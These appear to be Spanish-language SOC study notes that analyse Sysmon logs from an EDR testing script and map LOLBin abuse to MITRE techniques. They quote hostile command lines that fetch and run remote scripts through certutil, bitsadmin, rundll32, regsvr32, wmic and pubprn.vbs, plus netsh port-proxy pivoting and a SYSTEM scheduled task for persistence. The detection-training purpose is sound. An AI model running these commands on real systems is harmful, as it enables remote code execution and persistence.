`C:\Logs\SAMPLES-SPLUNK\EVTX-ATTACK-SAMPLES-master\AutomatedTestingTools\panache_sysmon_vs_EDRTestingScript.evtx`

```bash
index=attack_lab source=C:\\Logs\\SAMPLES-SPLUNK\\EVTX-ATTACK-SAMPLES-master\\AutomatedTestingTools\\panache_sysmon_vs_EDRTestingScript.evtx
| rex field=Message "(?<RealTime>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\.\d{3})"
| eval _time=strptime(RealTime,"%Y-%m-%d %H:%M:%S.%3N")
| rex field=Message "(?<Process>[A-Za-z]:\\\\[^\s]+\.exe)"
| rex field=Message "(?<WorkingDir>[A-Za-z]:\\\\[^\s]+\\\\)\s+[A-Z0-9]+\\\\"
| rex field=Message "(?<User>[A-Z0-9]+\\\\[A-Za-z0-9]+)\s+(Low|Medium|High|System)"
| rex field=Message "(?<Integrity>Low|Medium|High|System)"
| rex field=Message "IMPHASH=[^\s]+\s+(?<ParentImage>[A-Za-z]:\\\\[^\s]+\.exe)\s+(?<ParentCommandLine>.+)$"
| rex field=Message "(?<RawCmd>Microsoft Corporation\s+(.+?)\s+[A-Za-z]:\\\\[^\s]+\\\\\s+[A-Z0-9]+\\\\)"
| rex field=Message "(?<ParentCommandLine>C:\\\\Windows\\\\[^\s]+\.exe\s+[-/a-zA-Z0-9\s]+)$"
| eval CommandLine=replace(RawCmd,"Microsoft Corporation\s+","")
| rename ComputerName as Host
| sort 0 + _time
| eval Time=strftime(_time,"%Y-%m-%d %H:%M:%S.%3N")
| table Time ParentImage ParentCommandLine Host User WorkingDir Integrity Process CommandLine Message
```

![Pasted image 20260501063034](../Fotos/Pasted%20image%2020260501063034.png)
🔥 ALTAMENTE sospechoso en producción
Porque combina:
- LOLBIN (`certutil`)
- decoding de payload
- generación de DLL
- ejecución desde CMD

- **T1027 – Obfuscated Files or Information**
- **T1140 – Deobfuscate/Decode Files**
- **T1105 – Ingress Tool Transfer**
- **T1059.003 – Command and Scripting Interpreter: Windows Command Shell**

![Pasted image 20260501064045](../Fotos/Pasted%20image%2020260501064045.png)
🧠 ¿Qué es `bitsadmin.exe`?
- Herramienta legítima de Windows
- Nombre: **Background Intelligent Transfer Service**

📌 Uso normal:
- updates de Windows
- transferencias en background

📌 Uso malicioso:
- descarga de payloads (LOLBIN)

👉 MITRE:
- **T1105 – Ingress Tool Transfer**

1. Descarga archivo desde:
```
https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
```

2. Lo guarda como:
```
C:\Windows\system32\Default_File_Path.ps1
```

🧠 ¿Qué es `Start-BitsTransfer`?
- Cmdlet nativo de PowerShell
- Usa el mismo servicio BITS

📌 Pero aquí cambia algo importante:  
👉 ya no es una herramienta externa, es **PowerShell interno**

📌 Esto es clave:
- `.ps1` = PowerShell script
- se está preparando ejecución remota

 🟡 1. Nivel de visibilidad

|Técnica|Visibilidad SOC|
|---|---|
|bitsadmin.exe|ALTA (fácil de detectar)|
|PowerShell Start-BitsTransfer|MEDIA / BAJA (más sigiloso)|
- **T1105 – Ingress Tool Transfer**
Pero diferencian en subtecnicas:

|Método|MITRE|
|---|---|
|bitsadmin.exe|T1105 + T1059.003 (CMD)|
|Start-BitsTransfer|T1105 + T1059.001 (PowerShell)|
![Pasted image 20260501065240](../Fotos/Pasted%20image%2020260501065240.png)
🧠 2. `InstallUtil.exe`
 📌 ¿Qué es?
- Herramienta legítima de Microsoft .NET Framework
- Nombre: **Installer Utility**
👉 Ubicación:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\
```

 🧠 Uso normal
- instalar o desinstalar componentes .NET
- ejecutar instaladores legítimos

💀 Uso malicioso
- ejecutar código dentro de DLLs
- evadir EDR
- ejecutar payloads .NET sin `exe` directo

 🔹 `/logfile=`
- indica que NO se generen logs en archivo
📌 Implicación:  
👉 reduce trazabilidad

🔹 `/LogToConsole=false`
- evita salida en consola
📌 Implicación:  
👉 ejecución silenciosa (stealth)

 📌 `/U`
Significa:
**Uninstall = desinstalar**
Pero ojo: en `InstallUtil.exe` no es una desinstalación normal de Windows.
👉 Es una instrucción para que la DLL ejecute su método interno llamado:
- `Uninstall()`

 `🧩 InstallUtil.exe abuse`
Es una técnica conocida llamada:
- **LOLBIN (Living Off The Land Binary)**
- Abuso de herramientas legítimas de Windows

“Ejecuta la DLL `AllTheThings.dll` en modo **desinstalación**”

![Pasted image 20260501070131](../Fotos/Pasted%20image%2020260501070131.png)
📌 ¿Qué es MSHTA?
Microsoft HTML Application Host

👉 Es un ejecutor de aplicaciones HTML (.HTA)
Permite ejecutar:
- HTML
- JavaScript
- VBScript

MSHTA puede ejecutar código sin necesidad de navegador.
Por eso es un:
**LOLBIN (Living Off The Land Binary)**

Un **`.sct`** es un archivo que contiene código en formato:
- VBScript o JavaScript
- estructurado como “script COM”
👉 Es básicamente un script “empaquetado” para ser ejecutado por componentes de Windows.

`GetObject("script:URL")`
Esto hace:
👉 descarga y carga un **script remoto (.sct)**

`https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct`
👉 Esto es un script alojado en GitHub (remoto)

📌 `.Exec()`
Ejecuta el contenido del script.
En este caso probablemente:
- abre calculadora (`calc.exe`)
- o payload de prueba EDR

📌 `close()`
Cierra la ventana de mshta

- T1059.007 → JavaScript execution
- T1218.005 → MSHTA abuse
- T1105 → Remote file execution

![Pasted image 20260501072500](../Fotos/Pasted%20image%2020260501072500.png)

![Pasted image 20260501072612](../Fotos/Pasted%20image%2020260501072612.png)

![Pasted image 20260501074152](../Fotos/Pasted%20image%2020260501074152.png)
![Pasted image 20260501074217](../Fotos/Pasted%20image%2020260501074217.png)
Flujo completo:
1. Descarga script desde GitHub
2. Lo guarda en disco
3. Lo lee como bytes
4. Lo reconstruye como texto
5. Lo ejecuta en memoria con `IEX`

**PowerShell con IEX**
Windows PowerShell
- descarga archivo
- lo reconstruye en texto
- ejecuta directamente con `IEX`
👉 Este es el más cercano a **fileless execution real**

![Pasted image 20260501080903](../Fotos/Pasted%20image%2020260501080903.png)
🧩 2) `regsvcs.exe`
regsvcs.exe
📌 ¿Qué es?
Es una herramienta legítima de Windows/.NET que sirve para:
Registrar ensamblados .NET como servicios COM+ (Component Services)

📦 3) `AllTheThings.dll`
Es el assembly .NET que se está cargando.
👉 Puede contener clases con lógica que `regsvcs.exe` va a invocar.

¿Qué es un _.NET Assembly_?
📦 Un “paquete” que contiene código compilado + recursos + metadatos listos para ejecutarse dentro del entorno .NET.

![Pasted image 20260501081541](../Fotos/Pasted%20image%2020260501081541.png)
🧩 2) `regasm.exe`
regasm.exe
📌 ¿Qué es?
**RegAsm = Registration Assembly Tool**
👉 Sirve para registrar un **.NET assembly como componente COM (Component Object Model)**
`AllTheThings.dll`
Es el **.NET assembly** que se está procesando.


⚙️ ¿Qué tienen en común?
Ambos
✔ Cargan un **.NET assembly (.DLL)**  
✔ Pueden ejecutar código dentro del assembly  
✔ Son herramientas legítimas de Windows  
✔ Se usan para **registrar componentes del sistema**  
✔ Son LOLBINs (Living-off-the-land)

👉 En términos de ataque:
ambos pueden ser usados como “launchers” de ejecución de DLL maliciosa

*Diferencias*

|Característica|regsvcs|regasm|
|---|---|---|
|Objetivo|COM+ Services|COM Interop|
|Uso típico|servicios del sistema|objetos COM reutilizables|
|impacto|más “sistema”|más “interacción entre apps”|
|abuso atacante|ejecución en contexto COM+|ejecución vía objetos COM|
![Pasted image 20260501082840](../Fotos/Pasted%20image%2020260501082840.png)
![Pasted image 20260501083157](../Fotos/Pasted%20image%2020260501083157.png)
🧩 2) `regsvr32.exe`
regsvr32.exe
📌 ¿Qué es?
Herramienta legítima de Windows para:
registrar y ejecutar DLLs COM (Component Object Model)

🧠 3) Flags del comando
🔹 `/s`
- Silent mode (sin mensajes)
🔹 `/u`
- Unregister (desregistrar)
- puede ejecutar lógica de “unregister”
🔹 `/i:URL`
👉 ESTE es el punto clave
Permite cargar un archivo desde Internet:
```
https://raw.githubusercontent.com/.../Cmstp_calc.sct
```
`scrobj.dll`
📌 ¿Qué es?
Es el “handler” que permite:
ejecutar scripts COM (SCT / scriptlets)

Flujo completo:
1. `regsvr32.exe` se ejecuta
2. usa `scrobj.dll` como handler
3. carga script remoto desde GitHub (`.sct`)
4. ejecuta código dentro del script
5. sin escribir archivos locales visibles

![Pasted image 20260501083508](../Fotos/Pasted%20image%2020260501083508.png)
🧩 2) `MSBuild.exe`
📌 ¿Qué es?
Es la herramienta oficial de Microsoft para:
compilar proyectos .NET (`.csproj`, `.sln`)

📦 3) `xxxFile.csproj`
Es un archivo de proyecto .NET (XML) que contiene:
- código fuente
- instrucciones de compilación
- tareas pre/post build

MSBuild es especial porque:
no es un “ejecutor de scripts”, sino un **compilador que puede ejecutar código durante la compilación**

![Pasted image 20260501084254](../Fotos/Pasted%20image%2020260501084254.png)
🧩 2) `wmic`
wmic.exe
📌 ¿Qué es?
WMIC es una herramienta de Windows para:
consultar y administrar el sistema mediante WMI (Windows Management Instrumentation)
*Permite ejecutar consultas como:*
- procesos
- servicios
- hardware
- configuración del sistema

`/format:"https://raw.githubusercontent.com/.../Wmic_calc.xsl"`
WMIC permite aplicar un **formato XSL (stylesheet)** para mostrar resultados. (XSL (Extensible Stylesheet Language))
- ese XSL puede contener código malicioso
  - JavaScript embebido
  - instrucciones de ejecución
  - payloads disfrazados

🔥 “WMI + XSL fileless execution”

![Pasted image 20260501091930](../Fotos/Pasted%20image%2020260501091930.png)
⚙️ 1) `netsh`
📌 ¿Qué es?
Herramienta de Windows para:
- configurar red
- diagnosticar conexiones
- capturar tráfico (tracing

📦 2) `trace start capture=yes`
Activa el **trazado de red (network tracing)**.
👉 Esto permite capturar eventos de red similares a un packet capture.

⚙️ 3) Parámetros importantes
🔹 `capture=yes`
- habilita captura de tráfico
🔹 `filemode=append`
- agrega datos al archivo existente
🔹 `persistent=yes`
- la captura sigue incluso tras reinicio
🔹 `tracefile=trace.etl`
- guarda en archivo **ETL (Event Trace Log)**

👉 Activa captura de tráfico de red del sistema y la guarda en un archivo ETL.
⚠️ ¿Es malicioso?
❌ No necesariamente
Pero en ciberseguridad puede ser:
 🔴 sospechoso si:
- se ejecuta sin contexto admin legítimo
- aparece antes de un ataque
- se usa en persistencia
- se usa para espionaje de tráfico interno

![Pasted image 20260501092053](../Fotos/Pasted%20image%2020260501092053.png)
Y todo está siendo lanzado desde:
```
C:\ProgramData\ssh\runtests.bat
```
- **todo lo que ves es ejecutado por un script `.bat`**
- **típico de automatización maliciosa o testing EDR**

![Pasted image 20260501092431](../Fotos/Pasted%20image%2020260501092431.png)
🟡 FASE 1: inspección de trazas
```
netsh trace show status
```
👉 Revisa si hay captura activa

![Pasted image 20260501092734](../Fotos/Pasted%20image%2020260501092734.png)
🔴 FASE 2: ejecución de DLL helper (CRÍTICO)
```
netsh.exe add helper AllTheThings.dll
```
📌 Esto es MUY importante:
👉 está cargando una DLL como **helper de netsh**
✔ posible ejecución de código dentro de la DLL  
✔ posible persistencia o extensión de funcionalidad  
✔ técnica rara en entornos normales

![Pasted image 20260501092901](../Fotos/Pasted%20image%2020260501092901.png)
 🔴 FASE 3: port forwarding (túnel / pivoting)
```
netsh interface portproxy add v4tov4 listenport=8080 connectport=8000 connectaddress=192.168.1.1
```
📌 Traducción:
- escucha en puerto 8080 local
- redirige tráfico a 192.168.1.1:8000
👉 Esto es:
🔥 **port forwarding / pivoting interno**

![Pasted image 20260501093832](../Fotos/Pasted%20image%2020260501093832.png)
🔁 FASE 4: manipulación del proxy
```
netsh interface portproxy delete v4tov4 listenport=8080
```
👉 limpia o cambia la configuración (evasión / rotación)

![Pasted image 20260501093918](../Fotos/Pasted%20image%2020260501093918.png)
🔵 FASE 5: captura de tráfico
```
netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etlnetsh trace stop
```
ETL (Event Trace Log)
📌 Esto:
- inicia captura de red
- guarda en `.etl`
- es persistente
👉 esto es **recolección de tráfico**

![Pasted image 20260501094129](../Fotos/Pasted%20image%2020260501094129.png)
🧩 ¿Qué es `dispdiag.exe`?
 📌 Función
Es una herramienta de Windows para:
recopilar información de diagnóstico sobre la pantalla (GPU, drivers, rendering, etc.)

🔥 **script automatizado que prueba/recopila capacidades del sistema**

![Pasted image 20260501100014](../Fotos/Pasted%20image%2020260501100014.png)
🧩 `rundll32.exe`
📌 ¿Qué hace?
Permite:
ejecutar una función específica dentro de una DLL

👉 Está diciendo:
“Carga la DLL y ejecuta la función llamada `EntryPoint`”

![Pasted image 20260501132059](../Fotos/Pasted%20image%2020260501132059.png)
🧩 1. Sincronización
- esperar que termine otro proceso
- evitar ejecuciones simultáneas
⏱️ una pausa dentro de un script automatizado que está ejecutando múltiples acciones (DLL, red, tracing, etc.)

![Pasted image 20260501132522](../Fotos/Pasted%20image%2020260501132522.png)Ves esto:
- `C:\Windows\System32\rundll32.exe`
- `C:\Windows\SysWOW64\rundll32.exe`
📌 ¿Qué significa?
👉 Se ejecuta en:
- **64 bits (System32)**
- **32 bits (SysWOW64)**

🔥 el script está probando compatibilidad en ambas arquitecturas

![Pasted image 20260501132656](../Fotos/Pasted%20image%2020260501132656.png)
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/.../test")
```
🔥 Esto es MUY importante
Aquí `rundll32` está siendo usado como:
🧠 motor de ejecución HTML/JavaScript (igual que MSHTA)

**Componentes clave**
 🔹 `mshtml`
- motor de Internet Explorer
 🔹 `RunHTMLApplication`
- permite ejecutar código HTML/JS
 🔹 `GetObject("script:URL")`
- descarga script remoto

“Usa rundll32 para ejecutar JavaScript que descarga y ejecuta código desde Internet”
🔥 **ejecución de payload + fallback + ejecución remota vía JavaScript usando rundll32**

- T1218.011 → rundll32 abuse
- T1059.007 → JavaScript execution
- T1105 → descarga remota
- T1027 → evasión/obfuscación

![Pasted image 20260501133029](../Fotos/Pasted%20image%2020260501133029.png)

![Pasted image 20260501133903](../Fotos/Pasted%20image%2020260501133903.png)
```
cmd /c taskkill /f /im rundll32.exe
```
👉 Si falla:
- mata el proceso
- limpia ejecución

![Pasted image 20260501134159](../Fotos/Pasted%20image%2020260501134159.png)
`certutil.exe -urlcache -split -f https://.../CradleTest.txt Default_File_Path2.ps1`
🧩 certutil.exe
📌 Uso normal:
- certificados
🚨 Uso malicioso:
🔥 descargar archivos desde internet

 📌 Parámetros
- `-urlcache` → usa cache
- `-split` → descarga fragmentada
- `-f` → forzar
👉 descarga:
- `.txt` → guardado como `.ps1`

Descarga un script PowerShell disfrazado desde GitHub
Ejecución de código vía rundll32 + intento fileless + fallback a descarga real con certutil

![Pasted image 20260501135448](../Fotos/Pasted%20image%2020260501135448.png)

![Pasted image 20260501140951](../Fotos/Pasted%20image%2020260501140951.png)
🧩 `cmstp.exe`
📌 ¿Qué es?
Herramienta de Windows para:
instalar perfiles de conexión (VPN / networking)

⚙️ Parámetros
🔹 `/s`
- modo silencioso (sin interacción)
🔹 `/ni`
- “no install prompts” (sin interfaz)
👉 = ejecución **totalmente silenciosa**

📦 `.inf`
INF file
📌 ¿Qué es?
Archivo de configuración usado para:
- instalar drivers
- configurar sistema

Un `.inf` puede:
🔥 ejecutar comandos arbitrarios durante la instalación

🔥 usa cmstp para ejecutar código remoto disfrazado como configuración de red

--------
![Pasted image 20260502103651](../Fotos/Pasted%20image%2020260502103651.png)
🧩 `forfiles.exe`
 📌 ¿Qué es?
Herramienta que permite:
ejecutar un comando para cada archivo que cumpla una condición

⚙️ Parámetros
🔹 `/p c:\windows\system32`
- ruta donde buscar
🔹 `/m notepad.exe`
- busca archivos llamados `notepad.exe`
🔹 `/c calc.exe`
- comando a ejecutar

“Busca notepad.exe en system32 y ejecuta calc.exe”
👉 `forfiles` está siendo usado como: 🔥 **proxy de ejecución (LOLBIN)**

![Pasted image 20260502104655](../Fotos/Pasted%20image%2020260502104655.png)
🧩 `winrm.exe`
📌 ¿Qué es?
Herramienta para:
ejecutar comandos remotamente en Windows (similar a SSH pero en Windows)

⚙️ `qc -q`
- `qc` → quick config
- `-q` → silencioso
👉 hace:
- habilita WinRM
- abre firewall
- configura servicio
👉 usa WinRM para invocar WMI (WMI (Windows Management Instrumentation))

 `Win32_Process`
Clase de WMI que permite:
crear procesos en el sistema

📌 `@{CommandLine="calc"}`
👉 indica:
ejecutar `calc`

🔥 **remote command execution / lateral movement technique**
- T1021.006 → WinRM
- T1047 → WMI
- T1059 → command execution


🧩 `cscript.exe`
 📌 ¿Qué es?
Ejecutor de scripts en consola:
ejecuta archivos `.vbs` o `.js`

🧩 `winrm.vbs`
📌 ¿Qué es?
Script que actúa como interfaz para usar WinRM desde VBScript.
👉 Alternativa a `winrm.exe`

🔥 ejecuta `calc.exe` usando WinRM + WMI a través de un script VBScript

cscript.exe
 └── winrm.vbs
      └── WinRM
           └── WMI (Win32_Process)
                └── calc.exe


![Pasted image 20260502112753](../Fotos/Pasted%20image%2020260502112753.png)
🧩 `schtasks.exe`
📌 Qué es
Herramienta para:
crear tareas programadas en Windows

⚙️ Parámetros
 🔹 `/create`
- crea una nueva tarea
🔹 `/tn "mysc"`
- nombre de la tarea → `"mysc"`
🔹 `/tr C:\windows\system32\calc.exe`
- programa a ejecutar  
👉 aquí: `calc.exe`
🔹 `/sc ONLOGON`
- trigger:
🔥 se ejecuta cuando alguien inicia sesión
 🔹 `/ru "System"`
- usuario:
🔥 se ejecuta como **SYSTEM** (máximo privilegio)
 🔹 `/f`
- fuerza creación (sobrescribe si existe)

🔥 crea una tarea programada que ejecuta calc.exe como SYSTEM cada vez que alguien inicia sesión
🔥 es **persistencia (persistence)**
T1053.005 → Scheduled Task

![Pasted image 20260502113514](../Fotos/Pasted%20image%2020260502113514.png)
🧩 1) `cscript.exe`
👉 ejecuta scripts `.vbs`
🧩 2) `pubprn.vbs`
📌 Qué es (legítimo)
Script de administración de impresoras.
👉 Pero aquí **no se usa para eso**

🔥 cargar recursos externos (incluyendo scripts)

🧩 3) `script:https://.../test.sct`
 📌 `script:`
👉 indica:
cargar un **script remoto**

🧩 `.sct`
(Scriptlet)
👉 ya lo viste antes:
🔥 archivo de script que puede ejecutar código (VBScript/JScript)

🔥 usa cscript + pubprn.vbs para descargar y ejecutar un script remoto (.sct)

cmd.exe
 └── cscript.exe
      └── pubprn.vbs
           └── descarga test.sct
                └── ejecuta código
					  🔥 **LOLBIN + Remote Script Execution**

**IOCs**
- `pubprn.vbs` → 🚨 raro
- `script:` → 🚨 muy sospechoso
- `.sct` → 🚨 ejecución remota
- GitHub raw → payload externo

🔥 Uso de `cscript.exe` junto con `pubprn.vbs` para cargar y ejecutar un script remoto (.sct), técnica de evasión mediante LOLBins que permite ejecución de código sin herramientas sospechosas directas.

🔥 Todo lo que estás viendo (winrm, forfiles, schtasks, etc.) viene de `runtests.bat`

